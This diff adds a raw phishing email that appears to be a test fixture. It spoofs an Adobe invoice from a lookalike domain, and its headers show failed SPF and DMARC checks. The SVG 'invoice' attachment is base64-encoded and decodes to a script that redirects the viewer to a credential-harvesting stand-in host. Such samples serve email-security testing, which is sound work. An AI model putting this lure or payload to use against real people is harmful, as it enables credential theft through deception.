@@ -1,0 +1,24 @@
+From: "Adobe Creative Cloud" <invoices@adobe-creative-billing.com>
+To: victim@company.com
+Subject: Tax Invoice for Adobe All Apps Subscription: invoice.svg
+Return-Path: <invoices@adobe-creative-billing.com>
+Reply-To: <invoices@adobe-creative-billing.com>
+Date: Fri, 16 Oct 2026 15:30:00 +0000
+Message-ID: <test-10-2026@mail-gateway.org>
+Authentication-Results: mx.company.com; spf=fail dkim=none dmarc=fail
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="===============BOUNDARY_PHISH_73_10=="
+
+--===============BOUNDARY_PHISH_73_10==
+Content-Type: text/html; charset=utf-8
+
+Attached is your tax invoice vector receipt.
+
+--===============BOUNDARY_PHISH_73_10==
+Content-Type: image/svg+xml; name="Invoice_Vector.svg"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Invoice_Vector.svg"
+
+PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnPjxzY3JpcHQ+d2luZG93LmxvY2F0aW9uPSdodHRwczovL2NyZWRlbnRpYWwtc3RlYWxlci5jb20vaGFydmVzdCc7PC9zY3JpcHQ+PC9zdmc+
+
+--===============BOUNDARY_PHISH_73_10==--
